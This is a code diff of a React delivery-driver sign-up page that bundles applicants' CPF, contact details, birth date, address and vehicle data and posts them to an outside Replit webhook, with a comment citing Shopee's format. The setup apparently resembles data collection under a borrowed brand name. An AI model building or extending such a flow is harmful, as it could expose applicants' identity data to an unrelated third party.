@@ -375,43 +375,31 @@ const Entrega: React.FC = () => {
         console.warn('[WEBHOOK] Erro ao parsear endereco_entrega');
       }
       
-      // Preparar dados no formato solicitado
+      // Preparar dados no formato exato solicitado pela Shopee
       const webhookData = {
-        // Dados pessoais
+        cpf: candidatoData.cpf ? candidatoData.cpf.replace(/\D/g, '') : '',
         name: candidatoData.nome || '',
         email: candidatoData.email || '',
-        phone: candidatoData.telefone ? candidatoData.telefone.replace(/\D/g, '') : '', // Apenas números
-        cpf: candidatoData.cpf ? candidatoData.cpf.replace(/\D/g, '') : '', // Apenas números
-        dataNascimento: candidatoData.dataNascimento || '',
-        
-        // Dados do veículo
-        tipoVeiculo: candidatoData.tipoVeiculo || '',
+        phone: candidatoData.telefone ? candidatoData.telefone.replace(/\D/g, '') : '',
         placa: candidatoData.placa || '',
+        cidade: enderecoData.cidade || '',
+        estado: enderecoData.estado || '',
+        cep: enderecoData.cep || '',
+        dataNascimento: candidatoData.dataNascimento || '',
         isRentedCar: candidatoData.isRentedCar || false,
-        vehicleInfo: candidatoData.vehicleInfo || null,
-        
-        // Dados do EPI (tamanho do colete)
-        tamanhoColete: epiData.tamanhoColete || '',
         tamanhoLuva: epiData.tamanhoLuva || '',
+        tipoVeiculo: candidatoData.tipoVeiculo || '',
         numeroCalcado: epiData.numeroCalcado || '',
-        
-        // Dados do endereço (incluindo número da casa)
+        tamanhoColete: epiData.tamanhoColete || '',
         endereco: {
-          cep: enderecoData.cep || '',
           logradouro: enderecoData.logradouro || '',
-          numero: enderecoData.numero || '', // Número da casa
-          bairro: enderecoData.bairro || '',
-          cidade: enderecoData.cidade || '',
-          estado: enderecoData.estado || '',
-          complemento: enderecoData.complemento || ''
+          bairro: enderecoData.bairro || ''
         },
-        
-        // Dados adicionais
-        cidade: candidatoData.cidade || '',
-        estado: candidatoData.estado || '',
-        cep: candidatoData.cep || '',
-        
-        // Timestamp
+        vehicleInfo: candidatoData.vehicleInfo || {
+          marca: '',
+          modelo: '',
+          ano: ''
+        },
         timestamp: new Date().toISOString()
       };
       
@@ -421,7 +409,7 @@ const Entrega: React.FC = () => {
       const webhookUrl = 'https://recoveryfy.replit.app/api/webhook/sfgxs4y6y8qrv1jp9ik6h5inigfgb6s0';
       
       const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 segundos timeout
+      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 segundos timeout
       
       try {
         const response = await fetch(webhookUrl, {
@@ -443,7 +431,7 @@ const Entrega: React.FC = () => {
       } catch (fetchError: any) {
         clearTimeout(timeoutId);
         if (fetchError.name === 'AbortError') {
-          console.warn('[WEBHOOK] Timeout após 3 segundos');
+          console.warn('[WEBHOOK] Timeout após 30 segundos');
         } else {
           console.warn('[WEBHOOK] Erro no envio:', fetchError.message);
         }
